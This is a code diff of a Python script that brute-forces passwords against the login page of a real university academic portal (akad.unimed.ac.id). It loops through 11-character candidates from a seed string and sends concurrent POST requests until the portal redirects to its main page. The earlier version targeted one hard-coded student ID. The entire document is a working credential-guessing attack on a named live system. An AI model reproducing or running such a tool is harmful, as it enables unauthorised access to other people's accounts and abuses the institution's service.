@@ -1,12 +1,11 @@
 import json
 import asyncio
-import ssl
 import requests
 import aiohttp
-import sys
-import threading
 
-async def requestlogin(sem,id, password):
+text = list("akuhebat10!")
+
+async def requestlogin(password):
     url = "https://akad.unimed.ac.id/index.php"
     header = {
     "Host" : "akad.unimed.ac.id",
@@ -19,46 +18,62 @@ async def requestlogin(sem,id, password):
         "action" : "login",
     }
     payload["pwd"] = password
-    payload["usid"] = id
     async with aiohttp.TCPConnector(ssl=False) as conn:
             async with aiohttp.ClientSession(connector=conn)as session:
-                async with sem, session.post(url=url, data=payload, headers=header, ssl=False) as request:
+                async with session.post(url=url, data=payload, headers=header) as request:
                     print(password)
                     if request.status == 200:
                         if(str(request.url) == "https://akad.unimed.ac.id/main.php"):
                             print(f"password benar {password}")
-                            sys.exit()
+                            exit()
 
-async def getLettersList(start):
-    elements = [*range(ord(start), 126)]
-    elements.extend(range(32, ord(start)))
-    return [chr(i) for i in elements]
-
-
-async def IteratePosition(index):
+    
+async def main():
     try:
-        global text, PASSWORDLENGHT,tasks
+        tasks = []
         sem = asyncio.Semaphore(1000)
-        if index == PASSWORDLENGHT - 1:
-            for character in await getLettersList(text[index]):
-                text[index] = character
-                pw = "".join(text)
-                print(pw)
-                task = asyncio.ensure_future(requestlogin(sem,4203250014,pw))
-                tasks.append(task)
-        else:
-            for character in await getLettersList(text[index]):
-                text[index] = character
-                await asyncio.gather(*tasks)
-                await IteratePosition(index + 1)
-    except:
+        async with aiohttp.ClientSession() as session:
+            for i in range (ord(text[0]),126,1):
+                text[0] = chr(i)
+                for i in range (ord(text[1]),126,1):
+                    text[1] = chr(i)
+                    for i in range (ord(text[2]),126,1):
+                        text[2] = chr(i)
+                        for i in range (ord(text[3]),126,1):
+                            text[3] = chr(i)
+                            for i in range (ord(text[4]),126,1):
+                                text[4] = chr(i)
+                                for i in range (ord(text[5]),126,1):
+                                    text[5] = chr(i)
+                                    for i in range (ord(text[6]),126,1):
+                                        text[6] = chr(i)
+                                        for i in range (ord(text[7]),126,1):
+                                            text[7] = chr(i)
+                                            for i in range (ord(text[8]),126,1):
+                                                text[8] = chr(i)
+                                                for i in range (ord(text[9]),126,1):
+                                                    text[9] = chr(i)
+                                                    for i in range (ord(text[10]),126,1):
+                                                        text[10] = chr(i)
+                                                        passw = "".join(text)
+                                                        async with sem:
+                                                            task = asyncio.ensure_future(requestlogin(passw))
+                                                            tasks.append(task)
+                                                    text[10] = chr(32)
+                                                text[9] = chr(32)
+                                                await asyncio.gather(*tasks,return_exceptions=True)
+                                            text[8] = chr(32)
+                                        text[7] = chr(32)
+                                    text[6] = chr(32)
+                                text[5] = chr(32)
+                            text[4] = chr(32)
+                        text[3] = chr(32)
+                    text[2] = chr(32)
+                text[1] = chr(32)
+            text[0] = chr(32)       
+        
+
+    except StopIteration:
         pass
 
-
-PASSWORDLENGHT = 11
-tasks = []
-text = list("akuhebat103")
-try:
-    asyncio.run(IteratePosition(0))
-except:
-    pass
+asyncio.run(main())
